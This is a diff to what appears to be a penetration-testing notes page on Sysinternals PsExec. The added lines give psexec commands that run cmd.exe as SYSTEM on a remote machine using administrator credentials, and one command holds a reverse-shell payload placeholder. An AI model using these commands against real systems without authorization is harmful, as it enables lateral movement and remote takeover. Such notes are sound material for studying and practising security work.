@@ -1,4 +1,4 @@
-# Psexec (\*\*pending test)
+# Psexec
 
 {% embed url="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec" %}
 
@@ -11,6 +11,14 @@ PsExec connects on port 445/TCP (SMB), and requires the supplied username to be 
 ```powershell
 psexec \\MACHINE_IP -u <username> -p <password> -i <remote_command>
 
-# eg. to get a shell on a remote server using admin credentials
-psexec \\MACHINE_IP -u Administrator -p pass1234 -i cmd.exe
+# eg. (1) 
+psexec \\MACHINE_IP -u Administrator -p pass1234 -i -s cmd.exe
+
+# eg. (2) 
+psexec \\MACHINE_IP -u Administrator -p pass1234 -i -s "<reverse_shell_payload>"
 ```
+
+* `-s` : Run the remote process in the System account
+* `-i` : Run the program so that it interacts with the desktop of the specified session on the remote system
+
+> Note that eg. (1) may not work for certain situations, such as when the command is ran from a remotely accessed machine (eg. via **SSH**).
